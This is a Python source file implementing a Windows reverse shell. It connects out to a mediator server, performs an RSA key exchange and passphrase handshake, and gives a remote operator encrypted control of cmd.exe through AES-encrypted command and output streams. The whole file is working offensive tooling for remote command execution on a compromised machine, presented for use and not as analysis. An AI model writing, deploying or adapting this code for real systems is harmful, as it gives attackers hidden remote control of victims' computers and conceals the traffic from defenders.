#!/usr/bin/env python3
"""
Program: windowsTarget.py
Author: C.J. May
Description: Basic TCP reverse shell -- to be used with mediator.py server to be bridged to the reverse shell handler client connection
"""

from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import socket
import subprocess
import threading


class WindowsRShell:
    def __init__(self, mediatorHost):
        self.handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if not mediatorHost:
            raise(ValueError("Hostname of mediator server not specified."))
        self.connect(mediatorHost)
        self.cipherKey = self.keyExchange()

    def readCommands(self, cmdexe):
        while True:
            nonce = self.handler.recv(16)
            tag = self.handler.recv(16)
            ciphertext = self.handler.recv(1024)
            cipher = AES.new(self.cipherKey, AES.MODE_EAX, nonce=nonce)
            command = cipher.decrypt(ciphertext)
            if len(command) > 0:
                cmdexe.stdin.write(command)
                cmdexe.stdin.flush()

    def sendResponses(self, cmdexe):
        while True:
            ch = cmdexe.stdout.read(1)
            cipher = AES.new(self.cipherKey, AES.MODE_EAX)
            nonce = cipher.nonce
            ciphertext, tag = cipher.encrypt_and_digest(ch)
            self.handler.send(nonce)
            self.handler.send(tag)
            self.handler.send(ciphertext)

    def keyExchange(self):
        pemPubKey = self.handler.recv(1024)
        pubKey = RSA.import_key(pemPubKey)
        key = get_random_bytes(32)
        cipher = PKCS1_OAEP.new(pubKey)
        message = cipher.encrypt(key)
        self.handler.send(message)
        return key

    def connect(self, mediatorHost):
        self.handler.connect((socket.gethostbyname(mediatorHost), 20001))
        self.handler.sendall("Stepping onto platform nine and three quarters...".encode())
        handlerKey = self.handler.recv(1024)
        if handlerKey.decode() != "I solemnly swear that I am up to no good.":
            exit()

    def run(self):
        cmdexe = subprocess.Popen(["\\windows\\system32\\cmd.exe"],
                                  shell=True,
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.STDOUT,
                                  stdin=subprocess.PIPE)
        s2p_thread = threading.Thread(target=self.readCommands, args=[cmdexe])
        s2p_thread.daemon = True
        s2p_thread.start()
        p2s_thread = threading.Thread(target=self.sendResponses, args=[cmdexe])
        p2s_thread.daemon = True
        p2s_thread.start()
        try:
            cmdexe.wait()
        except KeyboardInterrupt:
            self.handler.close()


if __name__ == "__main__":
    rShell = WindowsRShell(mediatorHost="example.com")
    rShell.run()

